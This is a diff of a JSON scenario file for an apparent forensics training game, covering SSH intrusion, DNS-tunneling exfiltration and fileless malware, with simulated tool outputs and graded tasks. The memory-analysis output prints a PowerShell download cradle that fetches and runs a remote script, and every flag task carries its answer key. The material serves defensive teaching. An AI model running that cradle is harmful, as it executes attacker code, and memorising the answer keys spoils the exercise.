+          "-r /forensic/logs/capture.pcap -Y dns": "Running DNS filter on capture.pcap...\n\n  No. Time       Source        Destination     Protocol  Info\n  412 02:25:15   10.0.0.5      203.0.113.66    DNS       Standard query A TVQQ2YLJNR2S4Y3PNVWWK.exfil.shadow-pulse.cc\n  413 02:25:15   203.0.113.66  10.0.0.5        DNS       Standard query response\n  414 02:25:16   10.0.0.5      203.0.113.66    DNS       Standard query A MFZWIZB2NRQXG5DBMJSXI33S.exfil.shadow-pulse.cc\n  415 02:25:16   203.0.113.66  10.0.0.5        DNS       Standard query response\n  416 02:25:17   10.0.0.5      203.0.113.66    DNS       Standard query A N5XGO3JAON2HE2LOM4.exfil.shadow-pulse.cc\n  417 02:25:17   203.0.113.66  10.0.0.5        DNS       Standard query response\n  ...(843 additional DNS queries)\n\n[!] WARNING: DNS query subdomains contain Base32-encoded data\n[!] Pattern matches DNS tunneling exfiltration technique\n[!] All queries resolve to exfil.shadow-pulse.cc via server 203.0.113.66\n\n847 DNS packets displayed",
+          "-r /var/log/network/capture.pcap -Y dns": "Running DNS filter on capture.pcap...\n\n  No. Time       Source        Destination     Protocol  Info\n  412 02:25:15   10.0.0.5      203.0.113.66    DNS       Standard query A TVQQ2YLJNR2S4Y3PNVWWK.exfil.shadow-pulse.cc\n  413 02:25:15   203.0.113.66  10.0.0.5        DNS       Standard query response\n  414 02:25:16   10.0.0.5      203.0.113.66    DNS       Standard query A MFZWIZB2NRQXG5DBMJSXI33S.exfil.shadow-pulse.cc\n  415 02:25:16   203.0.113.66  10.0.0.5        DNS       Standard query response\n  416 02:25:17   10.0.0.5      203.0.113.66    DNS       Standard query A N5XGO3JAON2HE2LOM4.exfil.shadow-pulse.cc\n  417 02:25:17   203.0.113.66  10.0.0.5        DNS       Standard query response\n  ...(843 additional DNS queries)\n\n[!] WARNING: DNS query subdomains contain Base32-encoded data\n[!] Pattern matches DNS tunneling exfiltration technique\n[!] All queries resolve to exfil.shadow-pulse.cc via server 203.0.113.66\n\n847 DNS packets displayed",
+          "-r /forensic/logs/capture.pcap -qz io,stat,1": "Protocol Statistics for capture.pcap\n====================================\nDuration: 7952 seconds\nTotal packets: 1423\n\nProtocol  Packets  Bytes     Percentage\n--------  -------  --------  ----------\nTCP         523    156,920     36.8%\nUDP         853    412,256     59.9%\nICMP         12      1,008      0.8%\nOther        35      8,400      2.5%\n\nTop Talkers:\n  10.0.0.5       -> 203.0.113.66    : 847 packets (DNS/UDP)\n  10.0.0.5       -> 192.168.1.50    : 312 packets (TCP)\n  10.0.0.5       -> 10.0.0.12       : 198 packets (TCP/SSH)\n\n[!] DNS traffic to 203.0.113.66 dominates — potential exfiltration channel"
+        },
+        "output": "Usage: tshark -r <pcap_file> [options]\nTerminal-based Wireshark for deep packet analysis.\nOptions: -Y <display_filter>, -qz <statistics>"
+      },
+      {
+        "name": "whois",
+        "description": "Query WHOIS databases for IP/domain registration information",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "203.0.113.66": "% WHOIS lookup for 203.0.113.66\n\nNetRange:     203.0.113.0 - 203.0.113.255\nCIDR:         203.0.113.0/24\nNetName:      SHADOW-INFRASTRUCTURE\nOrganization: Shadow Infrastructure LLC\nRegDate:      2026-08-22\nCountry:      RU\nStateProv:    Moscow Oblast\n\nContact:      abuse@shadow-infra.ru\nComment:      This network has been flagged in multiple threat intelligence feeds.\n\n[!] IP is registered to a known bulletproof hosting provider\n[!] Associated with APT-41 (Shadow Pulse) infrastructure",
+          "exfil.shadow-pulse.cc": "% WHOIS lookup for exfil.shadow-pulse.cc\n\nDomain: shadow-pulse.cc\nRegistrar: PrivateReg LTD\nCreated: 2026-09-30\nExpires: 2027-09-30\nNameservers:\n  ns1.shadow-infra.ru\n  ns2.shadow-infra.ru\n\nRegistrant:\n  Organization: REDACTED FOR PRIVACY\n  Country: RU\n\n[!] Domain registered 15 days before the attack\n[!] Uses same infrastructure as known APT-41 C2 servers"
+        },
+        "output": "Usage: whois <IP or domain>\nLookup registration information for IP addresses and domains."
       }
     ],
     "tasks": [
       {
-        "id": "net_task_0",
-        "title": "Trace signal to server",
-        "details": "Use 'trace-connection' to locate the remote server",
+        "id": "net_task_1",
+        "title": "Trace the suspicious signal",
+        "details": "The IDS detected anomalous traffic from an internal server. Use 'trace-connection' to locate the compromised machine.",
         "points": 10,
         "checkType": null,
         "interactionTarget": null,
@@ -236,14 +460,14 @@
         "checkArgs": []
       },
       {
-        "id": "net_task_1",
-        "title": "Scan the target IP",
-        "details": "Use 'nmap 10.0.0.5' to scan the identified target",
-        "points": 10,
+        "id": "net_task_2",
+        "title": "Enumerate target services",
+        "details": "The compromised server is at 10.0.0.5. Use 'nmap 10.0.0.5' to discover what services are running and identify potential vulnerabilities.",
+        "points": 15,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
-        "hintCost": 2,
+        "hintCost": 3,
         "hasHint": false,
         "checkCommand": "nmap",
         "checkArgs": [
@@ -251,9 +475,24 @@
         ]
       },
       {
-        "id": "net_task_2",
-        "title": "Connect to the remote server",
-        "details": "Click on the server to establish an SSH connection",
+        "id": "net_task_3",
+        "title": "Identify the exploited service",
+        "details": "From the nmap scan results, which service was flagged as vulnerable and likely used as the entry point? Enter only the service name (lowercase).",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Look at the nmap output — which service shows a specific vulnerability CVE? OpenSSH 7.6p1 is known to be outdated and exploitable.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "ssh"
+      },
+      {
+        "id": "net_task_4",
+        "title": "Connect to the compromised server",
+        "details": "Click on the server to establish a secure connection and access the log files for forensic analysis.",
         "points": 10,
         "checkType": "interaction",
         "interactionTarget": "Server",
@@ -262,11 +501,12 @@
           "deviceName": "remote_server",
           "deviceType": "remote",
           "mountPoint": "/var/log/network",
-          "message": " Connected to server 10.0.0.5 via SSH\nLogs available. Use 'ls /var/log/network'",
+          "message": " Connected to nephilim-srv (10.0.0.5) via forensic SSH session\nEvidence logs available at /var/log/network\nUse 'ls /var/log/network' to list available evidence files",
           "mountContent": {
-            "auth.log": "Oct 15 03:45:10 server sshd[1234]: Failed password for admin from 192.168.1.50\nOct 15 03:45:15 server sshd[1234]: Failed password for admin from 192.168.1.50\nOct 15 03:45:23 server sshd[1234]: Accepted password for admin from 192.168.1.50",
-            "network.pcap": "[Binary packet capture - 15MB]\nHTTP requests to suspicious domains detected",
-            "firewall.log": "DENY 192.168.1.100 -> 10.0.0.5:3389 [RDP]\nALLOW 192.168.1.50 -> 10.0.0.5:22 [SSH]"
+            "auth.log": "Oct 15 02:15:33 nephilim-srv sshd[2401]: Failed password for admin from 192.168.1.50 port 44231 ssh2\nOct 15 02:15:36 nephilim-srv sshd[2401]: Failed password for admin from 192.168.1.50 port 44231 ssh2\nOct 15 02:15:40 nephilim-srv sshd[2401]: Failed password for admin from 192.168.1.50 port 44231 ssh2\nOct 15 02:15:44 nephilim-srv sshd[2401]: Failed password for admin from 192.168.1.50 port 44231 ssh2\nOct 15 02:15:48 nephilim-srv sshd[2401]: Failed password for admin from 192.168.1.50 port 44231 ssh2\nOct 15 02:15:53 nephilim-srv sshd[2401]: Accepted password for admin from 192.168.1.50 port 44231 ssh2\nOct 15 02:15:53 nephilim-srv sshd[2401]: pam_unix(sshd:session): session opened for user admin\nOct 15 02:16:05 nephilim-srv sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\nOct 15 02:18:12 nephilim-srv sshd[2455]: Accepted publickey for svc_backup from 10.0.0.12 port 55021 ssh2\nOct 15 02:18:12 nephilim-srv sshd[2455]: pam_unix(sshd:session): session opened for user svc_backup\nOct 15 02:30:44 nephilim-srv sshd[2401]: pam_unix(sshd:session): session closed for user admin",
+            "firewall.log": "Oct 15 02:10:00 ALLOW 192.168.1.50 -> 10.0.0.5:22 [SSH] SYN\nOct 15 02:15:53 ALLOW 192.168.1.50 -> 10.0.0.5:22 [SSH] ESTABLISHED\nOct 15 02:16:10 ALLOW 10.0.0.5 -> 192.168.1.50:4444 [UNKNOWN] SYN\nOct 15 02:16:10 ALLOW 10.0.0.5 -> 192.168.1.50:4444 [UNKNOWN] ESTABLISHED\nOct 15 02:17:30 DENY  192.168.1.100 -> 10.0.0.5:3389 [RDP]\nOct 15 02:18:00 ALLOW 10.0.0.5 -> 10.0.0.12:22 [SSH] SYN\nOct 15 02:18:12 ALLOW 10.0.0.5 -> 10.0.0.12:22 [SSH] ESTABLISHED\nOct 15 02:25:00 ALLOW 10.0.0.5 -> 203.0.113.66:443 [HTTPS] SYN\nOct 15 02:25:01 ALLOW 10.0.0.5 -> 203.0.113.66:443 [HTTPS] ESTABLISHED\nOct 15 02:25:15 ALLOW 10.0.0.5 -> 203.0.113.66:53 [DNS] UDP\nOct 15 04:31:22 DENY  192.168.1.50 -> 10.0.0.5:22 [SSH] SYN (blocked by incident response)",
+            "access.log": "192.168.1.50 - admin [15/Oct/2026:02:20:33 +0000] \"GET /admin/dashboard HTTP/1.1\" 200 4523\n192.168.1.50 - admin [15/Oct/2026:02:21:10 +0000] \"GET /admin/users/export HTTP/1.1\" 200 156720\n192.168.1.50 - admin [15/Oct/2026:02:22:45 +0000] \"GET /api/v1/clients?format=csv HTTP/1.1\" 200 2340156\n192.168.1.50 - admin [15/Oct/2026:02:23:01 +0000] \"POST /api/v1/transfer HTTP/1.1\" 403 128\n10.0.0.1 - - [15/Oct/2026:08:00:00 +0000] \"GET / HTTP/1.1\" 200 1024",
+            "capture.pcap": "[Binary packet capture — 24MB]\nUse tcpdump or tshark to analyze this file.\n1423 packets captured from nephilim-srv eth0 interface.\nCapture period: Oct 15 02:10:00 — Oct 15 04:35:00"
           }
         },
         "hintCost": 2,
@@ -275,99 +515,168 @@
         "checkArgs": null
       },
       {
-        "id": "net_task_3",
-        "title": "Hash network capture files before analysis",
-        "details": "Before analyzing evidence, compute hashes of all log files for integrity documentation. Use 'sha256sum /var/log/network/*'",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": true,
-        "hint": "Hash all log files: sha256sum /var/log/network/*",
-        "checkCommand": "sha256sum",
-        "checkArgs": ["/var/log/network/*"]
-      },
-      {
-        "id": "net_task_4",
-        "title": "Create working copies of log files",
-        "details": "Create copies of evidence files for analysis, preserving originals. Use 'cp -r /var/log/network /forensic/logs'",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": true,
-        "hint": "Copy logs: cp -r /var/log/network /forensic/logs",
-        "checkCommand": "cp",
-        "checkArgs": ["-r", "/var/log/network", "/forensic/logs"]
-      },
-      {
         "id": "net_task_5",
-        "title": "List system logs",
-        "details": "Now work with the forensic copies in /forensic/logs. Use ls to explore the content.",
-        "points": 15,
+        "title": "Hash evidence for chain of custody",
+        "details": "Before any analysis, compute SHA256 hashes of all evidence files to document their integrity. Use 'sha256sum /var/log/network/*'",
+        "points": 20,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
-        "hintCost": 3,
+        "hintCost": 4,
         "hasHint": false,
-        "checkCommand": "ls",
+        "checkCommand": "sha256sum",
         "checkArgs": [
-          "/forensic/logs"
+          "/var/log/network/*"
         ]
       },
       {
         "id": "net_task_6",
-        "title": "Read authentication logs",
-        "details": "Use 'cat /var/log/network/auth.log'",
+        "title": "Create forensic working copies",
+        "details": "Never analyze original evidence directly. Create working copies using 'cp -r /var/log/network /forensic/logs'",
         "points": 20,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 4,
         "hasHint": false,
-        "checkCommand": "cat",
+        "checkCommand": "cp",
         "checkArgs": [
-          "/var/log/network/auth.log"
+          "-r",
+          "/var/log/network",
+          "/forensic/logs"
         ]
       },
       {
         "id": "net_task_7",
-        "title": "Search for failed SSH attempts",
-        "details": "Use 'grep \"Failed password\" /var/log/network/auth.log'",
-        "points": 20,
-        "checkType": null,
+        "title": "Identify the attacker's IP address",
+        "details": "Analyze the authentication logs at '/forensic/logs/auth.log'. What IP address was used to perform the SSH brute-force attack and ultimately gain access?",
+        "points": 25,
+        "checkType": "flag",
         "interactionTarget": null,
         "onInteract": null,
-        "hintCost": 4,
-        "hasHint": false,
-        "checkCommand": "grep",
-        "checkArgs": [
-          "Failed password",
-          "/var/log/network/auth.log"
-        ]
+        "hintCost": 5,
+        "hasHint": true,
+        "hint": "Use 'cat /forensic/logs/auth.log' or 'grep \"Failed password\" /forensic/logs/auth.log'. The same IP appears in both failed and successful login attempts.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "192.168.1.50"
       },
       {
         "id": "net_task_8",
-        "title": "Analyze packet capture",
-        "details": "Use 'tcpdump' to see captured traffic statistics",
+        "title": "Count the brute-force attempts",
+        "details": "How many failed SSH login attempts were recorded before the attacker gained access? Enter only the number.",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Use 'grep \"Failed password\" /forensic/logs/auth.log' to filter only the failed attempts, then count the matching lines.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "5"
+      },
+      {
+        "id": "net_task_9",
+        "title": "Detect the reverse shell",
+        "details": "After gaining SSH access, the attacker established a reverse shell back to their machine. Analyze the firewall logs at '/forensic/logs/firewall.log' to find the outbound connection. What port did the reverse shell connect to? Enter only the port number.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "Look in firewall.log for outbound connections FROM the server (10.0.0.5) TO the attacker's IP (192.168.1.50) on an unusual port. Port 4444 is a classic reverse shell port often used by Metasploit.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "4444"
+      },
+      {
+        "id": "net_task_10",
+        "title": "Identify lateral movement",
+        "details": "Attackers often pivot through compromised machines. Analyze the firewall and auth logs — which internal server did the attacker move to after compromising nephilim-srv? Enter the IP address.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "In firewall.log, look for SSH connections FROM 10.0.0.5 TO other internal IP addresses. Cross-reference with auth.log — the 'svc_backup' account login provides a clue.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "10.0.0.12"
+      },
+      {
+        "id": "net_task_11",
+        "title": "Analyze DNS exfiltration traffic",
+        "details": "The IDS flagged suspicious DNS traffic. Use tshark to filter DNS queries from the packet capture: 'tshark -r /forensic/logs/capture.pcap -Y dns'",
         "points": 25,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 5,
-        "hasHint": false,
-        "checkCommand": "tcpdump",
-        "checkArgs": []
+        "hasHint": true,
+        "hint": "Run the tshark command exactly as shown. DNS tunneling hides data inside DNS query subdomains — the Base32-encoded strings before the domain name are the stolen data.",
+        "checkCommand": "tshark",
+        "checkArgs": [
+          "-r",
+          "/forensic/logs/capture.pcap",
+          "-Y",
+          "dns"
+        ]
+      },
+      {
+        "id": "net_task_12",
+        "title": "Identify the C2 exfiltration domain",
+        "details": "The tshark output reveals DNS tunneling activity. What domain name is being used as the exfiltration channel? Enter the full domain (e.g., subdomain.example.com).",
+        "points": 35,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 7,
+        "hasHint": true,
+        "hint": "Look at the DNS queries in the tshark output. The encoded subdomains all share a common parent domain — that domain is the C2 exfiltration channel. It contains the threat group's name.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "exfil.shadow-pulse.cc"
+      },
+      {
+        "id": "net_task_13",
+        "title": "Determine what data was exfiltrated",
+        "details": "The attacker accessed the web application before exfiltrating data. Review the web server access logs at '/forensic/logs/access.log'. What type of data did they download (look for the largest response)? Enter only the data type keyword from the URL path.",
+        "points": 35,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 7,
+        "hasHint": true,
+        "hint": "Use 'cat /forensic/logs/access.log' and look for the HTTP request with the largest response size (in bytes). The URL path '/api/v1/clients?format=csv' with a 2.3MB response reveals what was stolen.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "clients"
+      },
+      {
+        "id": "net_task_14",
+        "title": "Establish the initial compromise time",
+        "details": "Based on all evidence collected, when did the attack begin? Enter the timestamp of the first brute-force attempt in HH:MM format.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "The attack timeline starts with the earliest malicious event. Look at the first 'Failed password' entry in auth.log for the exact time (HH:MM format).",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "02:15"
       }
     ]
   },
   "memory_forensic": {
     "id": "memory_forensic",
-    "title": "Memory Forensic",
-    "description": "Analyze RAM memory dump to find artifacts",
-    "introduction": "A RAM memory dump contains traces of malware. Before analysis, you must verify the dump's integrity and create a working copy. Then analyze it using forensic tools to discover what malicious processes were running.",
+    "title": "Memory Forensic Investigation",
+    "description": "Analyze a live RAM dump to uncover a fileless malware attack using Volatility",
+    "introduction": "OPERATION PHANTOM THREAD — Meridian Capital Partners, a quantitative trading firm, detected unauthorized trades on their platform. The SOC team captured a live 8GB memory dump from the primary trading workstation (WKS-TRADE-07) using LiME before the system was shut down. Initial disk forensics found NO malware artifacts — this is a fileless attack operating entirely in memory. You must analyze the RAM dump using Volatility to uncover the attack chain, identify injected processes, and determine what was stolen.",
     "badge": "Memory Forensic Expert",
     "interactableObjects": [
       "HD2-01_HD-2_0",
@@ -380,7 +689,7 @@
         "type": "command",
         "requiresArgs": true,
         "validArgs": {
-          "/dev/sdc": "SHA256(/dev/sdc) = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n\n[✓] Hash computed successfully.\n[!] Record this value - it proves the memory dump has not been modified."
+          "/dev/sdc": "SHA256(/dev/sdc) = a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2\n\n[✓] Hash computed successfully.\n[!] Record this value — it proves the memory dump has not been modified."
         },
         "output": "Usage: sha256sum <file or device>\nComputes cryptographic hash for forensic integrity verification."
       },
@@ -395,23 +704,71 @@
         "output": "Usage: dd if=<source> of=<destination>\nCreates bit-by-bit copy for forensic analysis."
       },
       {
-        "name": "memdump-info",
-        "description": "Display memory dump metadata and statistics",
-        "output": "Memory Dump Analysis\n====================\nSize: 8GB\nOS: Windows 10 x64\nCaptured: 2024-10-15 03:45:00\nHash: a7f3e8c9d2b1f4e6"
-      },
-      {
         "name": "find-malware",
-        "description": "Scan for malicious signatures in memory",
+        "description": "Decrypt obfuscated memory regions for analysis",
         "type": "minigame",
         "gameType": "decryption",
-        "output": "[*] Scanning memory for malware signatures...\n[!] Found 3 suspicious processes:\n  - PID 1234: suspicious.exe (RISK: HIGH)\n  - PID 5678: malware.dll (RISK: CRITICAL)\n  - PID 9012: keylogger.sys (RISK: CRITICAL)"
+        "output": "[*] Decrypting obfuscated memory regions...\n[!] Multiple encrypted payloads detected in memory.\n[!] Manual decryption required to proceed with analysis.\n\n[✓] Decryption complete — protected memory regions are now readable.\n[✓] Volatility plugins can now parse injected code segments."
+      },
+      {
+        "name": "vol-imageinfo",
+        "description": "Volatility imageinfo — Identify the OS profile and metadata of a memory dump",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/forensic/memdump.img": "Volatility Foundation Volatility Framework 2.6.1\nINFO    : volatility.debug    : Determining profile based on KDBG search...\n\n          Suggested Profile(s) : Win10x64_19041\n                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)\n                     AS Layer2 : FileAddressSpace (/forensic/memdump.img)\n                      PAE type : No PAE\n                           DTB : 0x1ad000\n                          KDBG : 0xf8005c2ba520\n          Number of Processors : 4\n     Image Type (Service Pack) : 0\n                KPCR for CPU 0 : 0xfffff80058f29000\n                KPCR for CPU 1 : 0xffffe38010d48000\n                KPCR for CPU 2 : 0xffffe38010e80000\n                KPCR for CPU 3 : 0xffffe38010f90000\n           Image date and time : 2024-11-22 14:30:15 UTC+0000\n     Image local date and time : 2024-11-22 09:30:15 -0500"
+        },
+        "output": "Usage: vol-imageinfo <memory_dump>\nVolatility imageinfo plugin — identifies the operating system profile and metadata.\nExample: vol-imageinfo /forensic/memdump.img"
+      },
+      {
+        "name": "vol-pslist",
+        "description": "Volatility pslist — List running processes from memory dump",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/forensic/memdump.img": "Volatility Foundation Volatility Framework 2.6.1\n\nOffset(V)          Name                    PID   PPID   Thds   Start\n------------------ -------------------- ------ ------ ------ -------------------\n0xffffae8134567890 System                    4      0     98   2024-11-22 08:00:01\n0xffffae8134568000 smss.exe                388      4      2   2024-11-22 08:00:03\n0xffffae8134569000 csrss.exe               492    384     10   2024-11-22 08:00:05\n0xffffae813456a000 wininit.exe             568    384      1   2024-11-22 08:00:06\n0xffffae813456b000 services.exe            636    568      5   2024-11-22 08:00:07\n0xffffae813456c000 lsass.exe               660    568      7   2024-11-22 08:00:07\n0xffffae813456d000 svchost.exe             828    636     12   2024-11-22 08:00:09\n0xffffae813456e000 svchost.exe             912    636      8   2024-11-22 08:00:10\n0xffffae813456f000 svchost.exe            1064    636     21   2024-11-22 08:00:12\n0xffffae8134570000 svchost.exe            1240    636      6   2024-11-22 08:00:14\n0xffffae8134571000 explorer.exe           2104   2080     34   2024-11-22 08:01:30\n0xffffae8134572000 chrome.exe             2856   2104     18   2024-11-22 08:15:44\n0xffffae8134573000 TradingApp.exe         3100   2104      8   2024-11-22 08:16:02\n0xffffae8134574000 svchost.exe            3472    636     15   2024-11-22 13:48:10  [!] SUSPICIOUS: High thread count\n0xffffae8134575000 notepad.exe            3688   2104      1   2024-11-22 09:22:18\n0xffffae8134576000 RuntimeBroker.exe      3820   1064      3   2024-11-22 08:01:45\n0xffffae8134577000 powershell.exe         4012   2104      5   2024-11-22 13:47:32  [!] SUSPICIOUS: Spawned by explorer\n0xffffae8134578000 cmd.exe                4156   4012      1   2024-11-22 13:47:35"
+        },
+        "output": "Usage: vol-pslist <memory_dump>\nVolatility pslist plugin — enumerates running processes.\nExample: vol-pslist /forensic/memdump.img"
+      },
+      {
+        "name": "vol-malfind",
+        "description": "Volatility malfind — Detect injected code and suspicious memory regions",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/forensic/memdump.img": "Volatility Foundation Volatility Framework 2.6.1\n\nProcess: svchost.exe  Pid: 3472  Address: 0x00000000024f0000\nFlags: COMMIT_CHARGE | MEM_COMMIT | MEM_RESERVE\nProtection: PAGE_EXECUTE_READWRITE     [ALERT: RWX memory region]\n\n0x024f0000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............\n0x024f0010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......\n0x024f0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n0x024f0030  00 00 00 00 00 00 00 00 00 00 00 00 e8 00 00 00   ................\n\n[!] INJECTED PE DETECTED in svchost.exe (PID 3472)\n[!] Signature match: Cobalt Strike beacon shellcode\n[!] Injection technique: Process Hollowing\n\n---------------------------------------------------------------------\n\nProcess: powershell.exe  Pid: 4012  Address: 0x00000000031a0000\nFlags: COMMIT_CHARGE | MEM_COMMIT\nProtection: PAGE_EXECUTE_READWRITE     [ALERT: RWX memory region]\n\n0x031a0000  49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20   IEX (New-Object \n0x031a0010  53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c   System.Net.WebCl\n0x031a0020  69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74   ient).DownloadSt\n0x031a0030  72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 31 38   ring('https://18\n\n[!] SUSPICIOUS SCRIPT in powershell.exe (PID 4012)\n[!] PowerShell download cradle detected — initial payload delivery\n[!] Decoded: IEX (New-Object System.Net.WebClient).DownloadString('https://185.141.27.93/stage2.ps1')",
+          "/forensic/memdump.img -p 3472": "Volatility Foundation Volatility Framework 2.6.1\n\nProcess: svchost.exe  Pid: 3472  Address: 0x00000000024f0000\nFlags: COMMIT_CHARGE | MEM_COMMIT | MEM_RESERVE\nProtection: PAGE_EXECUTE_READWRITE     [ALERT: RWX memory region]\n\n0x024f0000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............\n0x024f0010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......\n0x024f0020  47 45 54 20 2f 62 65 61 63 6f 6e 2f 69 6e 69 74   GET /beacon/init\n0x024f0030  20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a    HTTP/1.1..Host:\n0x024f0040  20 31 38 35 2e 31 34 31 2e 32 37 2e 39 33 0d 0a    185.141.27.93..\n\n[!] INJECTED PE DETECTED — Cobalt Strike beacon\n[!] Injection technique: Process Hollowing\n[!] Beacon configuration:\n    C2 Server: 185.141.27.93:443\n    Sleep time: 60s\n    Jitter: 25%\n    Pipe name: \\\\.\\pipe\\msupdate_7f3a\n[!] The legitimate svchost.exe process was hollowed and replaced with attacker code.",
+          "/forensic/memdump.img -p 4012": "Volatility Foundation Volatility Framework 2.6.1\n\nProcess: powershell.exe  Pid: 4012  Address: 0x00000000031a0000\nFlags: COMMIT_CHARGE | MEM_COMMIT\nProtection: PAGE_EXECUTE_READWRITE     [ALERT: RWX memory region]\n\n0x031a0000  49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20   IEX (New-Object \n0x031a0010  53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c   System.Net.WebCl\n0x031a0020  69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74   ient).DownloadSt\n0x031a0030  72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 31 38   ring('https://18\n0x031a0040  35 2e 31 34 31 2e 32 37 2e 39 33 2f 73 74 61 67   5.141.27.93/stag\n0x031a0050  65 32 2e 70 73 31 27 29 00 00 00 00 00 00 00 00   e2.ps1')........\n\n[!] SUSPICIOUS SCRIPT in powershell.exe (PID 4012)\n[!] PowerShell download cradle detected — initial payload delivery\n[!] Decoded: IEX (New-Object System.Net.WebClient).DownloadString('https://185.141.27.93/stage2.ps1')\n[!] Method used: DownloadString (System.Net.WebClient)\n[!] Parent process: explorer.exe (PID 2104) — launched via macro execution"
+        },
+        "output": "Usage: vol-malfind <memory_dump> [-p <PID>]\nVolatility malfind plugin — detects injected code, suspicious memory regions, and PE headers.\nExample: vol-malfind /forensic/memdump.img\nExample: vol-malfind /forensic/memdump.img -p 3472\nExample: vol-malfind /forensic/memdump.img -p 4012"
+      },
+      {
+        "name": "vol-netscan",
+        "description": "Volatility netscan — Display active network connections from memory",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
+          "/forensic/memdump.img": "Volatility Foundation Volatility Framework 2.6.1\n\nOffset(P)          Proto    Local Address                  Foreign Address      State            Pid\n------------------ -------- ------------------------------ -------------------- --------------- ------\n0xae8134590000     TCPv4    10.10.15.22:49152              185.141.27.93:443    ESTABLISHED      3472\n0xae8134591000     TCPv4    10.10.15.22:49168              185.141.27.93:8443   ESTABLISHED      3472\n0xae8134592000     TCPv4    10.10.15.22:50211              104.16.132.229:443   ESTABLISHED      2856\n0xae8134593000     TCPv4    10.10.15.22:50215              142.250.185.206:443  ESTABLISHED      2856\n0xae8134594000     TCPv4    10.10.15.22:50220              52.167.144.196:443   ESTABLISHED      3100\n0xae8134595000     UDPv4    10.10.15.22:53                 *:*                                    912\n0xae8134596000     TCPv4    10.10.15.22:49889              185.141.27.93:4444   CLOSE_WAIT       4012\n0xae8134597000     TCPv4    10.10.15.22:139                *:*                  LISTENING           4\n0xae8134598000     TCPv4    10.10.15.22:445                *:*                  LISTENING           4\n\n[!] SUSPICIOUS: PID 3472 (svchost.exe) — 2 connections to 185.141.27.93 (ports 443, 8443)\n[!] SUSPICIOUS: PID 4012 (powershell.exe) — connection to 185.141.27.93:4444 (CLOSE_WAIT)\n[!] Legitimate traffic: PID 2856 (chrome.exe), PID 3100 (TradingApp.exe)"
+        },
+        "output": "Usage: vol-netscan <memory_dump>\nVolatility netscan plugin — scans for active network connections and sockets.\nExample: vol-netscan /forensic/memdump.img"
+      },
+      {
+        "name": "vol-dlllist",
+        "description": "Volatility dlllist — List loaded DLLs for a specific process",
+        "type": "command",
+        "requiresArgs": true,
+        "validArgs": {
